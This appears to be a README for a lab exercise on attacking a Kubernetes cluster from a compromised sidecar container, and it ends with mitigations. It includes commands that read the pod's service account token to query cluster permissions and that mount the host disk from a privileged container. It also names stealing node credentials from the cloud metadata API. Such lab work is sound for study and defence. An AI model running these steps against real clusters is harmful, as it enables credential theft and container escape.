# Attacking cluster from malicious sidecar

## Setup

- Build the sidecar

```bash
docker build . -t malicious-sidecar
```

- Setup the cluser

```bash
kubectl apply -f cluster/
```

- Check pods are healthy with

```bash
kubectl get pods
```

- Jump to sidecar terminal with

```bash
kubectl exec --stdin --tty <insert-pod-name> -c sidecar-container -- /bin/bash
```

Or simply

```bash
kubectl get pods -l app=simple-webapp -o name | rg "pod/" -r "" | head -n 1 | xargs -o -J % kubectl exec -it % -c sidecar-container -- /bin/bash
```

## Attack vectors

### Kubernetes service account

- Service account in `/run/secrets/kubernetes.io/serviceaccount` (token, namespace, cert)

Running `kubectl` with the service account

```bash
kubectl --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt --server=https://192.168.65.4:6443 auth can-i --list
```

### Mount host (priviledged=true)

<https://www.optiv.com/insights/source-zero/blog/kubernetes-attack-surface>

Find disks from /proc folder. I found `/dev/vda1` from `/proc/mounts` file.

```bash
mount /dev/vda1 /mnt-test/
```

### Cloud metadata API, and expanding attack to other cloud services

- Get Node credentials

## Mitigations

- Own service account for sidecar
- Disallow hostNetwork, hostPID, hostIPC, privileged, host-root
- TODO:
  - Network policies (egress rules, pods should not have access to places they do not need)
  - Pod security
    - Volume whitelists (no root volumes)
    - Root limits (no priviledge, container user?)
    - AppArmor
